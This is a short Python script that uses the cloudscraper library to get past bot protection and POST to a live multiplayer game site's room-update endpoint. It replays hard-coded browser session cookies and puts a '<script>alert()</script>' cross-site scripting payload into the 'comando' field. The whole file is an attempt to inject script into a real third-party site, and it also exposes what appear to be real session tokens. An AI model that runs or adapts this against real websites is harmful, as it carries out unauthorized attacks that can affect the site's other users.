import  cloudscraper


scraper = cloudscraper.create_scraper(  browser={
        'browser': 'firefox',
        'platform': 'windows',
		'mobile': True
    })


cookies = {
	"__utma": "212885122.1023224719.1611319503.1615884179.1621071394.17",
	"__utmb": "212885122.3.10.1621071404",
	"__utmc": "212885122",
	"__utmt": "1",
	"__utmz": "212885122.1611319503.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)",
	"_fbp": "fb.2.1611319503727.1949961508",
	"aceita": "600ac8ce2640f",
	"aviso_regras": "ok",
	"desenho": "1mqcstam3f5etkrmts60vrc4n1",
	"FCCDCF": "[[\"AKsRol9mMcdF2EuB-PHTKe27KsDkERXtQ7RUw6jYPB03fao7UXX15AzPOj3-s_1mSNYT_4NdxSjrnR5nA9zcWDgmvBSvBebC3KgapF00-HaBI3w92BU4Fl_ncFABbD2VkIGbMnpgd80MDLzKNlW_jG6VTJs-AF2fdg==\"],null,[\"[[],[],[],[],null,null,true]\",1621071501321],null]"
}


url = "https://gartic.com.br/room/atualizar.php?lastid=1862587019&cache=1621071769930"




dados = {"comando":"7@<script>alert()</script>@13"}

r = scraper.post(url, data=dados, cookies=cookies)

print(r.text)